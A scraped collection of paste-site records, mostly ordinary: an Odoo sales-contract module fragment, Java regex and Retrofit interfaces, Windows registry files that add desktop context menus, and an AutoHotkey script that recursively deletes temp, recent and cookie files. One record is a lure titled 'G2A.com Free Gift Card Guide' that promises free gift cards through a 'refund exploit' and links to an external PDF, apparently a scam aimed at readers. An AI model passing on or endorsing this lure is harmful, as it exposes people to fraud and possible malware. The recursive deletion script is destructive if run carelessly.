    #             'tax_ids': False,
    #             # 'currency_id' : contract.billing_currency,
    #             'quantity': 1,
    #         }))

    #         invoice_vals = {
    #             'partner_id': contract.customer.id,
    #             'move_type': 'out_invoice',
    #             'invoice_date': date.today(),
    #             ""contract_id"": contract.id,
    #             'invoice_line_ids': invoice_line_vals
    #         }

    #         customer_bills = self.env['account.move'].create(invoice_vals)

    def show_bills(self):
        return {
            ""name"": ""Contracts"",
            ""domain"": [
                (""contract_id"", ""="", self.id),
                (""move_type"", ""="", ""out_invoice""),
            ],
            ""view_type"": ""form"",
            ""res_model"": ""account.move"",
            ""view_id"": False,
            ""view_mode"": ""tree,form"",
            ""type"": ""ir.actions.act_window"",
            ""context"": ""{'create': False}"",
        }

    def show_payments(self):
        return {
            ""name"": ""Payments"",
            ""domain"": [(""contract_id"", ""="", self.id)],
            ""view_type"": ""tree,form"",
            ""res_model"": ""account.payment"",
            ""view_id"": False,
            ""view_mode"": ""tree,form"",
            ""type"": ""ir.actions.act_window"",
            ""context"": ""{'create': False}"",
        }

    def show_deliveries(self):
        return {
            ""name"": ""Job Cards"",
            ""domain"": [(""contract_id"", ""="", self.id)],
            ""view_type"": ""form"",
            ""res_model"": ""rtt.jobcard"",
            ""view_id"": False,
            ""view_mode"": ""tree,form"",
            ""type"": ""ir.actions.act_window"",
            ""context"": ""{'create': False}"",
        }

    @api.model
    def create(self, vals):
        if vals.get(""name"", ""New"") == ""New"":
            vals[""name""] = (
                self.env[""ir.sequence""].next_by_code(""contract.sequence"") or ""New""
            )
        return super().create(vals)

    def receive_payment(self):
        pay_journals = self.env[""account.journal""].search(
            [(""type"", ""in"", (""bank"", ""cash""))], limit=1
        )
        for rec in self:
            context = dict(
                {
                    ""default_payment_type"": ""inbound"",
                    ""default_partner_type"": ""customer"",
                    ""default_ref"": rec.name,
                    ""default_date"": date.today(),
                    ""default_destination_account_id"": rec.customer.property_account_receivable_id.id,
                    ""default_journal_id"": pay_journals.id,
                    ""default_partner_id"": rec.customer.id,
                    ""default_currency_id"": rec.sales_order.currency_id.id,
                    ""default_carbiz_contract_payment"": True,
                    ""default_contract_id"": rec.id,
                }
            )

            return {
                ""name"": _(""Collect Payment""),
                ""view_id"": self.env.ref(""account.view_account_payment_form"").id,
                ""view_mode"": ""form"",
                ""res_model"": ""account.payment"",
                ""type"": ""ir.actions.act_window"",
                ""target"": ""new"",
                ""context"": context,
            }

    @api.onchange(""days_balance"", ""days_installment"")
    def update_dates(self):
        for rec in self:
            if rec.days_balance > 0:
                rec.date_delivery = date.today() + relativedelta(days=rec.days_balance)
            if rec.days_balance == 0:
                rec.date_delivery = date.today()
            if rec.days_installment:
                rec.date_installment = date.today() + relativedelta(
                    days=rec.days_installment
                )

    def start_contract(self):
        # fields_to_check = ['down_payment', 'days_installment', 'no_install', 'days_balance', 'balance']
        fields_to_check = [""balance"", ""days_balance""]

        for rec in self:
            # Car check in by contracts
            car_search_by_contract_ids = self.search(
                [
                    (""product_id"", ""="", rec.product_id.id),
                    (""id"", ""!="", self.id),
                    (""state"", ""="", ""running"")
                ]
            )

            if len(car_search_by_contract_ids) > 0:
                rec.is_other_existing_contract = True

            # Add chassis number
            # Search for car_id
            car_id = self.env[""carbiz_erp.vehicle""].search(
                [(""product"", ""="", rec.product_id.id)], limit=1
            )

            rec.chassis_no = car_id.name

            # For not-straightforward payment
            if not (rec.amount == rec.down_payment) and rec.balance_installment < 1:
                for field in fields_to_check:
                    if getattr(rec, field) < 1:
                        raise UserError(
                            _(
                                ""Provide the {} amount."".format(
                                    field.replace(""_"", "" "").capitalize()
                                )
                            )
                        )

            rec.state = ""running""
            if rec.balance_installment > 0:
                rec.compute_installments()
            rec._check_contract_status()  # Check if the contract is already fulfilled

    def cancel_contract(self):
        for rec in self:
            if rec.is_other_existing_contract:
                rec.is_other_existing_contract = False

            rec.state = ""cancelled""

    def reset_contract(self):
        for rec in self:
            rec.state = ""draft""

            # Clear payments information
            for payment in rec.payments:
                payment.action_draft()
                payment.action_cancel()
            rec.payments = [(6, 0, 0)]

    def auto_complete_contract(self):
        for rec in self:
            contract_records = self.env[""sales.contracts""].search([])
            for data in contract_records:
                if data.state == ""running"":
                    data.state = ""completed""

    @api.onchange(""amount"", ""down_payment"", ""balance"")
    def calc_balance(self):
        for rec in self:
            # if rec.down_payment != 0.0:
            rec.balance_installment = rec.amount - (rec.down_payment + rec.balance)

    def compute_installments(self):
        fields_to_check = [""days_installment"", ""no_install""]

        for rec in self:
            if not rec.start_date:
                raise UserError(""Please state the installment start date."") 
            
            # Validate first fields
            for field in fields_to_check:
                if getattr(rec, field) < 1:
                    raise UserError(
                        _(
                            ""Provide the {} amount."".format(
                                field.replace(""_"", "" "").capitalize()
                            )
                        )
                    )

            rec.installment_lines.unlink()

            interval = int(rec.days_installment / rec.no_install)
            amounts = rec.balance_installment / rec.no_install
            due_dates = [
                 rec.start_date + relativedelta(days=i * interval)
                for i in range(1, rec.no_install + 1)
            ]

            for due_date in due_dates:
                self.env[""install.line""].create(
                    {
                        ""name"": rec.product_id.name + ""-"" + str(due_date),
                        ""amount"": amounts,
                        ""balance"": amounts,
                        ""due_date"": due_date,
                        ""status"": ""pending"",
                        ""amount_paid"": 0.0,
                        ""contract_id"": rec.id,
                    }
                )
"
vQaYick9,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Tuesday 30th of April 2024 12:08:13 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_849789.pdf

Working as of:
30 April 2024"
3HYmm2m1,Java Regex Validation Interface,GeorgePashev_88,Java,Monday 29th of April 2024 11:32:28 PM CDT,"package com.example.kontakti;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public interface Validation {
    public static boolean Validate(String text, String expression){
        final String regex = expression;//""[\\w_\\-]+@[\\w_\\.\\-]+\\.[\\w_\\-]{2,4}"";
        final String string = text;

        final Pattern pattern = Pattern.compile(regex, Pattern.MULTILINE);
        final Matcher matcher = pattern.matcher(string);

        while (matcher.find()) {
            return true;
        }
        return false;

    }

}
"
kDNxXepx,ContactAPI Retrofit Interface,GeorgePashev_88,Java,Monday 29th of April 2024 11:30:04 PM CDT,"package com.example.kontakti;

import java.util.List;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.GET;
import retrofit2.http.DELETE;
import retrofit2.http.POST;
import retrofit2.http.PUT;
import retrofit2.http.Path;

public interface ContactAPI {
    public class message{
        public String status;
        public message(message m){
            this.status = m.status;
        }
        public message(String _status){
            this.status = _status;
        }
    }
    public class  contacts{
        public int ID;
        public String name;
        public String address;
        public String phone;
        public String email;
        public contacts(contacts m){
            ID = m.ID;
            name = m.name;
            address = m.address;
            phone = m.phone;
            email = m.email;
        }
        public contacts(int _ID, String _name, String _address,
                        String _phone, String _email){
            ID = _ID;
            name = _name;
            address = _address;
            phone = _phone;
            email = _email;
        }
    }
    @GET(""/api/users"")
    public Call<List<contacts>> api_users();

    @GET(""/api/users/{id}"")
    public Call<contacts> api_get_user(@Path(""id"") int id);

    @POST(""/api/users/add"")
    public Call<contacts> api_add_user(@Body contacts c);

    @PUT(""/api/users/update"")
    public Call<contacts> api_update_user(@Body contacts c);

    @DELETE(""/api/users/delete/{id}"")
    public Call<message> api_delete_user(@Path(""id"") int id);


}
"
WvuxAvCT,TEMP-ALL-DELL.ahk,Najeebsk,Autohotkey,Monday 29th of April 2024 11:27:01 PM CDT,";clears all (temp) files in the listed directories, except the one's which are in use
;C:\Users\Najeeb\AppData\Local\Temp
dirs = %A_winDir%\Temp\*.*,%userprofile%\AppData\Local\Temp\*.*,C:\Temp\*.*,%userprofile%\Recent\*.*,%userprofile%\Cookies\*.txt,;%userprofile%\AppData\Local\Temporary Internet Files\*.*,C:\Windows\Prefetch\*.* ;all code above is on ONE line
Loop,parse,dirs,`,
{
   
IfExist,%A_LoopField%
   {
   Loop,%A_LoopField%,1,1
   FileRemoveDir,%A_LoopFileFullPath%,1
   FileDelete,%A_LoopField%
   }
}
FileRecycleEmpty"
BcMKHYs6,NAJEEB-WIN-X.reg,Najeebsk,REG,Monday 29th of April 2024 10:42:37 PM CDT,"Windows Registry Editor Version 5.00

;Created by Najeeb Shah Khan

[HKEY_CLASSES_ROOT\DesktopBackground\Shell\winxmenu]
""MUIVerb""=""Najeeb+X Menu""
""SubCommands""=""appwiz;network;power;event;sysdm;devmgr;diskmgmt;compmgmt;cmd;|;taskmgr;control;explorer;search;run;|;desktop""
""icon""=""imageres.dll,109""
""Position""=""Top""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\appwiz]
@=""Programs and Features""
""icon""=""appwiz.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\appwiz\command]
@=""control appwiz.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\network]
@=""Network Connections""
""icon""=""ncpa.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\network\command]
@=""control ncpa.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\power]
@=""Power Options""
""icon""=""powercfg.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\power\command]
@=""control powercfg.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\event]
@=""Event Viewer""
""icon""=""eventvwr.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\event\command]
@=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,\
  00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,6d,00,6d,00,\
  63,00,2e,00,65,00,78,00,65,00,20,00,2f,00,73,00,20,00,25,00,53,00,79,00,73,\
  00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,73,00,79,00,73,00,\
  74,00,65,00,6d,00,33,00,32,00,5c,00,65,00,76,00,65,00,6e,00,74,00,76,00,77,\
  00,72,00,2e,00,6d,00,73,00,63,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\sysdm]
@=""System""
""icon""=""sysdm.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\sysdm\command]
@=""control sysdm.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\devmgr]
@=""Device Manager""
""Icon""=hex(2):64,00,65,00,76,00,6d,00,67,00,72,00,2e,00,64,00,6c,00,6c,00,00,\
  00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\devmgr\command]
@=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,\
  00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,6d,00,6d,00,\
  63,00,2e,00,65,00,78,00,65,00,20,00,2f,00,73,00,20,00,25,00,53,00,79,00,73,\
  00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,73,00,79,00,73,00,\
  74,00,65,00,6d,00,33,00,32,00,5c,00,64,00,65,00,76,00,6d,00,67,00,6d,00,74,\
  00,2e,00,6d,00,73,00,63,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\diskmgmt]
@=""Disk Management""
""icon""=""devmgr.dll,4""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\diskmgmt\command]
@=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,\
  25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,6d,00,6d,\
  00,63,00,2e,00,65,00,78,00,65,00,20,00,2f,00,73,00,20,00,25,00,53,00,79,00,\
  73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,73,00,79,00,73,\
  00,74,00,65,00,6d,00,33,00,32,00,5c,00,64,00,69,00,73,00,6b,00,6d,00,67,00,\
  6d,00,74,00,2e,00,6d,00,73,00,63,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\compmgmt]
@=""Computer Management""
""icon""=""CompMgmtLauncher.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\compmgmt\command]
@=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,\
  25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,6d,00,6d,\
  00,63,00,2e,00,65,00,78,00,65,00,20,00,2f,00,73,00,20,00,25,00,53,00,79,00,\
  73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,73,00,79,00,73,\
  00,74,00,65,00,6d,00,33,00,32,00,5c,00,63,00,6f,00,6d,00,70,00,6d,00,67,00,\
  6d,00,74,00,2e,00,6d,00,73,00,63,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\cmd]
@=""Command Prompt""
""icon""=""cmd.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\cmd\command]
@=""cmd.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\taskmgr]
@=""Task Manager""
""icon""=""taskmgr.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\taskmgr\command]
@=""taskmgr.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\control]
@=""Control Panel""
""icon""=""control.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\control\command]
@=""control.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\explorer]
@=""Windows Explorer""
""icon""=""explorer.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\explorer\command]
@=""explorer.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\search]
@=""Search""
""icon""=""shell32.dll,22""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\Search\command]
@=""explorer shell:::{2559A1F0-21D7-11D4-BDAF-00C04F60B9F0}""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\run]
@=""Run""
""icon""=""shell32.dll,24""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\run\command]
@=""explorer shell:::{2559A1F3-21D7-11D4-BDAF-00C04F60B9F0}""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\desktop]
@=""Desktop""
""icon""=""shell32.dll,34""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\desktop\command]
@=""explorer shell:Desktop""
"
ZyrUaFce,NAJEEB-SYSTEM-APPS.reg,Najeebsk,REG,Monday 29th of April 2024 10:40:43 PM CDT,"Windows Registry Editor Version 5.00

;Created by Najeeb Shah Khan

[HKEY_CLASSES_ROOT\DesktopBackground\Shell\SystemTools]
""MUIVerb""=""System Tools""
""SubCommands""=""control;cleanmgr;devmgr;event;regedit;secctr;msconfig;taskmgr;taskschd;wu;tem""
""icon""=""imageres.dll,104""
""Position""=""Top""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\control]
@=""Control Panel""
""icon""=""control.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\control\command]
@=""control.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\cleanmgr]
@=""Disk Cleanup""
""icon""=""cleanmgr.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\cleanmgr\command]
@=""cleanmgr.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\devmgr]
@=""Device Manager""
""Icon""=hex(2):64,00,65,00,76,00,6d,00,67,00,72,00,2e,00,64,00,6c,00,6c,00,00,\
  00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\devmgr\command]
@=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,\
  00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,6d,00,6d,00,\
  63,00,2e,00,65,00,78,00,65,00,20,00,2f,00,73,00,20,00,25,00,53,00,79,00,73,\
  00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,73,00,79,00,73,00,\
  74,00,65,00,6d,00,33,00,32,00,5c,00,64,00,65,00,76,00,6d,00,67,00,6d,00,74,\
  00,2e,00,6d,00,73,00,63,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\event]
@=""Event Viewer""
""icon""=""eventvwr.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\event\command]
@=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,\
  00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,6d,00,6d,00,\
  63,00,2e,00,65,00,78,00,65,00,20,00,2f,00,73,00,20,00,25,00,53,00,79,00,73,\
  00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,73,00,79,00,73,00,\
  74,00,65,00,6d,00,33,00,32,00,5c,00,65,00,76,00,65,00,6e,00,74,00,76,00,77,\
  00,72,00,2e,00,6d,00,73,00,63,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\regedit]
@=""Registry Editor""
""icon""=""regedit.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\regedit\command]
@=""regedit.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\secctr]
@=""Security Center""
""icon""=""wscui.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\secctr\command]
@=""control wscui.cpl""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\msconfig]
@=""System Configuration""
""icon""=""msconfig.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\msconfig\command]
@=""msconfig.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\taskmgr]
@=""Task Manager""
""icon""=""taskmgr.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\taskmgr\command]
@=""taskmgr.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\taskschd]
@=""Task Scheduler""
""icon""=""miguiresource.dll,1""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\taskschd\command]
@=""Control schedtasks""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\wu]
@=""Windows Update""
""icon""=""wucltux.dll""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\wu\command]
@=""wuapp.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\tem]
@=""TEMP DELLETE""
""icon""=""SOF.dll,25""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\tem\command]
@=""cmd.exe /k start C:\\CMDER\\TOOLS\\TEMP-ALL-DELL.ahk""     "
mQar8DN0,NAJEEB-APPS.reg,Najeebsk,REG,Monday 29th of April 2024 10:38:14 PM CDT,"Windows Registry Editor Version 5.00

;Created by Najeeb Shah Khan
[HKEY_CLASSES_ROOT\DesktopBackground\Shell\WindowsApps]
""MUIVerb""=""Najeeb Apps""
""SubCommands""=""cmder;books;cmd;wordpad;ff;tor;notepad;paint;ser;ren;yt;web;vid;vlc;iptv;iptvx""
""icon""=""SOF.dll,99""
""Position""=""Top""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\cmder]
@=""CMDER""
""icon""=""Cmder.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\cmder\command]
@=""cmd.exe /k start C:\\CMDER\\CMDER.pyw""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\books]
@=""BOOKS""
""icon""=""SOF.dll,145""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\books\command]
@=""cmd.exe /k start C:\\CMDER\\BOOKS.pyw""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\cmd]
@=""Command Prompt""
""icon""=""cmd.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\cmd\command]
@=""cmd.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\wordpad]
@=""Wordpad""
""icon""=""write.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\wordpad\command]
@=""wordpad.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\ff]
@=""FFMPEG""
""icon""=""SOF.dll,72""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\ff\command]
@=""cmd.exe /k start C:\\CMDER\\FFMPEG.ahk""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\tor]
@=""Tor Browser""
""icon""=""F:\\PORTABLE\\Tor Browser\\Browser\\firefox.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\tor\command]
@=""F:\\PORTABLE\\Tor Browser\\Browser\\firefox.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\notepad]
@=""Notepad""
""icon""=""notepad.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\notepad\command]
@=""notepad.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\paint]
@=""Paint""
""icon""=""mspaint.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\paint\command]
@=""mspaint.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\ser]
@=""ALL DRIVE SEARCH""
""icon""=""SOF.dll,18""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\ser\command]
@=""cmd.exe /k start C:\\CMDER\\TOOLS\\ALL-SEARCH.ahk""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\ren]
@=""RENAME""
""icon""=""SOF.dll,129""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\ren\command]
@=""cmd.exe /k start C:\\CMDER\\TOOLS\\RENAME-EXT.pyw""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\yt]
@=""YOUTUBE SEARCH""
""icon""=""SOF.dll,61""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\yt\command]
@=""cmd.exe /k start C:\\CMDER\\TOOLS\\YOUTUBE-SEARCH-ALL.pyw""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\web]
@=""WEB-SCRAPING""
""icon""=""SOF.dll,81""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\web\command]
@=""cmd.exe /k start C:\\CMDER\\TOOLS\\WEB-SCRAPING-ALL-ELEMENTS.pyw""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\vid]
@=""VIDEOS-SERACH""
""icon""=""SOF.dll,110""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\vid\command]
@=""cmd.exe /k start C:\\CMDER\\TOOLS\\VIDEOS-SEARCH-PLAY.pyw""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\vlc]
@=""Vlc Media Player""
""icon""=""SOF.dll,58""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\vlc\command]
@=""vlc.exe""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\iptv]
@=""IPTV Search Player""
""icon""=""SOF.dll,60""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\iptv\command]
@=""cmd.exe /k start C:\\CMDER\\TOOLS\\IPTV-GITHUB-CATEGORIES.pyw""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\iptvx]
@=""IPTV X Player""
""icon""=""imageres.dll,84""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\iptvx\command]
@=""cmd.exe /k start C:\\CMDER\\TOOLS\\IPTV-PLAYER.pyw""


"
7aceNwGB,NAJEEB-FOLDER.reg,Najeebsk,REG,Monday 29th of April 2024 10:36:32 PM CDT,"Windows Registry Editor Version 5.00
;Created by Najeeb Shah Khan

[HKEY_CLASSES_ROOT\DesktopBackground\Shell\NajeebFolder]
""MUIVerb""=""Najeeb Folder""
""SubCommands""=""pic;vid;tem;pre;py;por;soft;tool;home""
""icon""=""SOF.dll,99""
""Position""=""Top""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\pic]
@=""Pictures""
""icon""=""FOL.dll,83""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\pic\command]
@=""explorer \""C:\\Users\\Najeeb\\Desktop\\FTP\\PICS\""""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\vid]
@=""Videos""
""icon""=""FOL.dll,49""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\vid\command]
@=""explorer \""D:\\VIDEOS\""""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\tem]
@=""TempFolder""
""icon""=""SOF.dll,26""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\tem\command]
